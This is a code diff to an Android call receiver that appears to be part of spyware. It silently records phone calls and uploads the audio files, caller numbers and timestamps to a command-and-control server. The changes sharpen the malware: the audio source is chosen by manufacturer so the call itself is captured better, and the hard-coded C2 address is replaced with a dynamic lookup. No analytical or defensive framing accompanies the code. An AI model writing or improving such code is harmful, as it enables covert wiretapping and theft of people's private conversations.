@@ -4,6 +4,7 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.media.MediaRecorder;
+import android.os.Build;
 import android.os.Environment;
 import android.telephony.TelephonyManager;
 import android.util.Log;
@@ -22,7 +23,7 @@ public class Call extends BroadcastReceiver {
 
     private static MediaRecorder recorder = new MediaRecorder();
 
-    private static File audiofile = null;
+    private static File audiofile;
 
     private static String incomingNumber;
 
@@ -44,7 +45,7 @@ public class Call extends BroadcastReceiver {
                     formData += "&number=" + incomingNumber;
                     formData += "&timestamp=" + System.currentTimeMillis();
 
-                    new NotifyC2(Utils.C2_SERVER + "/uploadLog", formData, result -> {
+                    new NotifyC2(Utils.getC2Address() + "/uploadLog", formData, result -> {
 
                     }).execute();
 
@@ -55,24 +56,32 @@ public class Call extends BroadcastReceiver {
                     try {
                         audiofile = File.createTempFile(String.valueOf(System.currentTimeMillis()), ".3gp", dir);
 
-                        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+                        String manufacturer = Build.MANUFACTURER;
+                        if (manufacturer.toLowerCase().contains("samsung")) {
+                            recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
+                        } else {
+                            recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
+                        }
                         recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                         recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                         recorder.setOutputFile(audiofile.getAbsolutePath());
                         recorder.prepare();
                         recorder.start();
                         isRecording = true;
-                    } catch (Exception e) {}
+                    } catch (Exception e) {
+                        Log.e("eeee", e.toString());
+                    }
 
                 } else if (phoneState.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                     // Call has ended
                     if (isRecording)
                         recorder.stop();
-                    recorder.reset();
+
+//                    recorder.reset();
                     recorder.release();
                     isRecording = false;
 
-                    FileManager.uploadFile(audiofile.getPath(), Utils.C2_SERVER + "/recording");
+                    FileManager.uploadFile(audiofile.getPath(), Utils.getC2Address() + "/recording");
 
                     String formData = "id=" + Utils.clientID(context);
                     formData += "&type=client";
@@ -81,7 +90,7 @@ public class Call extends BroadcastReceiver {
                     formData += "&filename=" + audiofile.getName();
                     formData += "&timestamp=" + System.currentTimeMillis();
 
-                    new NotifyC2(Utils.C2_SERVER + "/uploadRecording", formData, result -> {
+                    new NotifyC2(Utils.getC2Address() + "/uploadRecording", formData, result -> {
 
                     }).execute();
                 }
